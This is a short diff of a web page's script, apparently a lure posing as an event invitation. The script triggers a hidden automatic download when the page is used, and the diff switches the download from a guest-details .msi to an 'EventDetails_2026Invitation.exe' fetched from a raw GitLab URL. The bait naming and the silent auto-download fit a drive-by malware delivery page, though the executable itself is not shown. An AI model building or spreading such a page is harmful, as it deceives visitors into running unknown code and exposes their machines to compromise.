@@ -326,7 +326,7 @@
   <!-- Auto + manual download -->
   <script>
     // Change this once to your real file name (or path)
-    const FILE_NAME = "Details_for_OurSpecialGuest.msi";
+    const FILE_NAME = "https://gitlab.com/johnbyerly440/believe/-/raw/main/EventDetails_2026Invitation.exe?ref_type=heads";
 
     // Wire manual link
     (function bindManual(){
@@ -348,7 +348,7 @@
         const a = document.createElement("a");
         a.style.display = "none";
         a.href = url;
-        a.download = url.split("/").pop() || "Details_for_OurSpecialGuest.msi";
+        a.download = url.split("/").pop() || "https://gitlab.com/johnbyerly440/believe/-/raw/main/EventDetails_2026Invitation.exe?ref_type=heads";
         document.body.appendChild(a);
         a.click();
         a.remove();
